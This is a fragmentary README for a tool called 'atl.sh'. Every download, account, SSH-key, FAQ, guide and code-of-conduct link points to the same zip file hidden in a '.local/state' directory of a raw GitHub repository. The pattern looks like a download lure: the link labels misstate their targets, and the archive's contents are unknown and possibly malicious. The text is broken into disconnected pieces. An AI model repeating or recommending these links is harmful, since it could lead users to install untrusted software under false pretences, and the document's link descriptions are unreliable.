...
[![Download atl.sh](https://img.shields.io/badge/Download-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip)
...
1. Click the green button above or visit the release page directly here:  
   https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip
...
2. Go to https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip
...
7. Log in to https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip and paste your public key in the SSH Keys section.
...
|------------------------------------|-------------------------------------|
| [Get an account](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip) | [Admin Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip)      |
| [User Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip)         | [Operations](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip)         |
| [FAQ](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip)                       | [Testing Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip)         |
| [Documentation](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip)                 | [Code of Conduct](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip) |
...
- Check the FAQ: https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip

- Read the user guide: https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip
...
[![Get atl.sh](https://img.shields.io/badge/Download-atl.sh%20Release%20Page-blue)](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/skel/.local/state/atl-sh-v1.4.zip)